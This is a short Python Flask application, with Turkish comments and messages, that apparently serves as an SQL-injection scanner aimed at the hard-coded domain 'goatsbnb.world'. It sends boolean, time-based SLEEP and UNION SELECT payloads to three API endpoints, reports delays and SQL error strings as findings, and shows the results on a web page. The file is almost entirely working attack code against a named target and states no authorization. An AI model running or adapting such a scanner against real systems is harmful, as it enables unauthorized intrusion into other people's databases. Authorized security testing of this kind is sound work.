import requests
import time
from flask import Flask

app = Flask(__name__)
TARGET = "goatsbnb.world"

PAYLOADS = [
    "' OR '1'='1",
    "' AND SLEEP(5)-- ",
    "' UNION SELECT NULL-- ",
    "' UNION SELECT NULL,NULL-- ",
    "' OR 1=1-- ",
]

def test_sqli(url):
    results = []
    print(f"[*] Test başladı: {url}")
    for p in PAYLOADS:
        test_url = url.replace("{id}", p)
        try:
            start = time.time()
            r = requests.get(test_url, timeout=10)
            elapsed = time.time() - start
            if elapsed > 4.5:
                msg = f"[!] ZAMANLI SQLi: {test_url} (gecikme: {elapsed:.2f}s)"
                print(msg)
                results.append(msg)
            if "sql" in r.text.lower() or "mysql" in r.text.lower():
                msg = f"[!] HATALI SQLi: {test_url}"
                print(msg)
                results.append(msg)
        except Exception as e:
            msg = f"[-] Hata: {test_url} -> {e}"
            print(msg)
            results.append(msg)
    return results

@app.route('/')
def home():
    return """
    <h2>GOATsBNB SQLi Scanner</h2>
    <p><a href='/scan'>Tarama başlatmak için tıkla</a></p>
    <p>Sonuçlar log'da ve burada görünecek.</p>
    """

@app.route('/scan')
def scan():
    endpoints = [
        f"https://{TARGET}/api?id={{id}}",
        f"https://{TARGET}/v1/user?id={{id}}",
        f"https://{TARGET}/data?address={{id}}",
    ]
    all_results = []
    for ep in endpoints:
        all_results.extend(test_sqli(ep))
    
    # HTML çıktı oluştur
    html = "<h2>Tarama Sonuçları</h2><pre>"
    if all_results:
        html += "\n".join(all_results)
    else:
        html += "Hiçbir SQLi zafiyeti tespit edilemedi."
    html += "</pre><p><a href='/'>Ana sayfaya dön</a></p>"
    return html

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
